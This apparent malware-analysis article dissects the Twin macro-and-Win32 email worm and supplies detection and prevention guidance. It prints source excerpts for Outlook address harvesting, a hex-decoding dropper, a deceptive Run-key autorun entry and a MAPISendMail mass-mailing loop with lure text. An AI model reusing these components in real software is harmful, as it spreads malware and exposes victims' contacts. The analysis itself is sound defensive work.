# Dissecting W32/W97M.Twin (2002): A Dual-Stage Macro + Win32 Worm 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

W32/W97M.Twin is a two‑stage worm (January–February 2002) combining a Microsoft Word macro (VBA) with a Win32 payload written in assembly. The macro stage extracts addresses from Outlook’s MAPI address books, drops a VBScript that decodes and runs an embedded PE executable, and plants a decoy document. The native Win32 stage waits for network connectivity, parses the harvested address list, and mass‑mails the decoy as a “.doc” attachment via Simple MAPI. Twin illustrates how a macro‑borne stage can bootstrap a native mailer, using OS APIs and default mail configuration to propagate without user prompts. This analysis reviews both `Twin.bas` (macro) and `Twin.asm` (Win32) and extracts concrete defensive indicators.

## 1 – Overview of the Malware 🧩

- Type: Dual‑stage macro + Win32 email worm
- Stage 1 (VBA + VBS):
  - Harvest Outlook addresses and write them to `C:\backup.win`, then append a `#` marker and an embedded executable in hex.
  - Decode the hex into `%WINDIR%\AVW32.exe` and run it.
  - Copy the current Word document to `%WINDIR%\NetInfo.doc` (decoy payload).
- Stage 2 (Win32 ASM):
  - Add a startup value `AntiVirus Freeware` under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`.
  - Delete `C:\twin.vbs` (cleanup) and wait for internet.
  - Map and parse `C:\backup.win` to read email addresses up to `#`.
  - For each address, call `MAPISendMail` to send `%WINDIR%\NetInfo.doc` as `comical_story.doc` with a social‑engineering subject/body.

- Targets: Windows 9x/ME/NT/2000 with Outlook/MAPI.

## 2 – Source Code Analysis 🔍

### 2.1 Macro Stage (VBA): Address Harvesting and Dropper

Purpose: Build a VBScript that, when run, collects Outlook addresses into `C:\backup.win`, embeds a large hex-encoded PE in the same file (after a `#` separator), decodes a copy of the PE to `%WINDIR%\AVW32.exe`, copies the current document to `%WINDIR%\NetInfo.doc`, then launches the PE.

```vba
' Twin.bas – building Twin.vbs (inert excerpt; do NOT execute)
Open "C:\Twin.vbs" For Output As #1
Print #1, "Set fso=CreateObject(\"Scripting.FileSystemObject\")"
Print #1, "Set Twin=CreateObject(\"Outlook.Application\")"
Print #1, "Set deux=Twin.GetNameSpace(\"MAPI\")"
Print #1, "Set c=fso.CreateTextFile(\"C:\\backup.win\")"
Print #1, "For Each polux In deux.AddressLists"
Print #1, "  For jumeaux = 1 To polux.AddressEntries.Count"
Print #1, "    c.WriteLine castor.Address"
Print #1, "  Next"
Print #1, "Next"
Print #1, "c.WriteLine \"#\"" ' separator before hex blob
```

Impact: Forces Outlook automation via COM, enumerating MAPI `AddressLists` and writing each `Address` to `C:\backup.win`, then a sentinel `#` marking the end of addresses.

The VBS embeds a hex string variable `exe` (thousands of hex digits) and decodes it into a PE file named like a system utility.

```vba
' Decode embedded hex PE and drop/run (inert; do NOT execute)
Print #1, "lire=decr(exe)"
Print #1, "Set exfile=fso.CreateTextFile(win&\"\\AVW32.exe\",true)"
Print #1, "exfile.Write lire: exfile.Close"
Print #1, "fso.CopyFile \"" & full & "\", win&\"\\NetInfo.doc\""
Print #1, "w.Run win&\"\\AVW32.exe\", 1, False"
Print #1, "Function decr(octet)"
Print #1, " For hexa = 1 To Len(octet) Step 2"
Print #1, "  decr = decr & Chr(\"&h\" & Mid(octet, hexa, 2))"
Print #1, " Next"
Print #1, "End Function"
```

Impact: Reconstructs a binary from hex to `%WINDIR%\AVW32.exe`, plants `%WINDIR%\NetInfo.doc` as the future email attachment, and executes the native payload. The function `decr` performs hex→byte conversion.

### 2.2 Native Stage (ASM): Startup, Cleanup, and Prep

Purpose: Establish autorun, remove artifacts, and set the path of the decoy attachment.

```asm
; Twin.asm – setup (inert excerpt; do NOT execute)
push 25
push esi                     ; module path buffer
push 1
@pushsz "AntiVirus Freeware"
@pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
push 80000002h               ; HKLM
api  SHSetValueA             ; set startup value
@pushsz "C:\\twin.vbs"
api  DeleteFileA             ; cleanup VBS
push 50
push offset pathname
api  GetWindowsDirectoryA
@pushsz "\\NetInfo.doc"
push offset pathname
api  lstrcat                 ; pathname = %WINDIR%\NetInfo.doc
```

Impact: Creates an autorun value with a deceptive name and sets up the attachment path to the doc placed by the macro stage. Deletes the initial script to reduce on-disk artifacts.

### 2.3 Connectivity Gate and Address File Mapping

Purpose: Wait for internet connectivity; map `C:\backup.win`; scan for email addresses line‑by‑line until encountering `#`.

```asm
; Wait for network (inert; do NOT execute)
verif_inet:
    push 0
    push offset inet
    api InternetGetConnectedState
    dec eax
    jnz verif_inet
; Map C:\backup.win and get size
@pushsz "C:\\backup.win"
api CreateFileA  ; then CreateFileMappingA, MapViewOfFile
```

Impact: Busy‑waits on connectivity, then memory‑maps the harvested list created by stage 1.

The scanning loop builds an email address into `mail_addr` and emits a send when an end‑of‑line is reached and the buffer contained an `@`.

```asm
; Extract one email per line (inert; do NOT execute)
scan_mail:
    xor edx, edx               ; seen '@' flag
    mov edi, offset mail_addr
p_c:
    lodsb                      ; next byte
    cmp al, ' '      
    je  car_s                  ; skip spaces
    cmp al, 0Dh     
    je  entr1                  ; on CR => finalize & send
    cmp al, '#'
    je  f_mail                 ; '#' marks end of list
    cmp al, '@'
    jne not_a
    inc edx                    ; flag presence
not_a:
    stosb                      ; append char
    jmp p_c
entr1:
    xor al, al
    stosb                      ; NUL-terminate
    test edx, edx
    je   scan_mail             ; only send if '@' seen
    call send_mail
    jmp  scan_mail
```

Impact: Parsing is simple but effective; a `#` sentinel matches how the VBS wrote the file. Any address with an `@` gets mailed.

### 2.4 Email Propagation (Simple MAPI)

Purpose: Fire‑and‑forget email using Simple MAPI without explicit login, attaching the decoy doc.

```asm
; Send via MAPISendMail (inert; do NOT execute)
send_mail:
    xor eax, eax
    push eax
    push eax
    push offset Message        ; prefilled structure
    push eax
    push [sess]                ; default session (0)
    api  MAPISendMail
    ret
```

The prebuilt `Message` references subject/body and the attachment path.

```asm
; Message fields (inert; do NOT execute)
subject  db "A comical story for you.",0
body     db "I send you a comical story found on the Net.",0Dh,0Ah,0Dh,0Ah,9,
          "Best Regards. You friend.",0
filename db "comical_story.doc",0
Attach   dd ?,?,?
         dd offset pathname     ; %WINDIR%\NetInfo.doc
         dd offset filename     ; attachment name
```

Impact: The subject/body lures and consistent attachment name are solid string‑level indicators for detection and retro hunting.

## 3 – Mitigation and Defense Strategies 🛡️

### Detection Strategies (Analyst Focus)

- Files/artefacts:
  - `C:\Twin.vbs` (initial script) — may be deleted by stage 2 but often present transiently.
  - `C:\backup.win` (addresses + `#` + hex PE blob)
  - `%WINDIR%\AVW32.exe` (dropped PE from hex)
  - `%WINDIR%\NetInfo.doc` (decoy document mailed as `comical_story.doc`)
- Registry:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AntiVirus Freeware = <path to payload>`
- API/behavior:
  - Outlook automation via COM in VBS (`Outlook.Application`, `GetNameSpace("MAPI")`)
  - Dynamic/explicit use of `InternetGetConnectedState`, `MAPISendMail`
  - Toolmarks: memory mapping of `C:\backup.win`, busy‑wait connectivity loop
- Email telemetry:
  - Subject: “A comical story for you.”; attachment: `comical_story.doc` (content is actually `%WINDIR%\NetInfo.doc`)

### Prevention Strategies (Admin Focus)

- Macro hygiene:
  - Disable or restrict unsigned Office macros; enforce Protected View; use AMSI+antimalware integrations to scan macro/VBS content.
- Application control:
  - Allow only signed/approved executables in `%WINDIR%`; block execution from user‑writable locations; alert on newly created `%WINDIR%\AVW32.exe`/`NetInfo.doc`.
- Messaging controls:
  - Constrain Simple MAPI automation; require prompts/admin approval for `MAPISendMail` from non‑trusted processes; monitor or block executable attachments.
- Registry & file monitoring:
  - Watch HKLM Run keys for suspicious values (e.g., “AntiVirus Freeware”); detect reads/writes to `C:\backup.win` and transient `C:\Twin.vbs`.
- User education:
  - Warn about lures like “A comical story for you.” and unexpected `.doc` attachments following macro enables.

## Conclusion

Twin demonstrates a classic macro‑to‑native handoff: a VBA stage leverages Outlook to harvest addresses and a VBS to reconstruct and launch a native worm; the ASM stage then mass‑mails a benign‑looking document using Simple MAPI. The two components are tightly coupled through the shared file `C:\backup.win` and the decoy `%WINDIR%\NetInfo.doc`. Defenders can detect Twin with a mix of macro policy, autorun key monitoring, file/registry IOCs, and telemetry on MAPI/WinINet calls. By understanding how the macro and native pieces interact, teams can craft layered detections that break the chain early—before mass mailing begins.
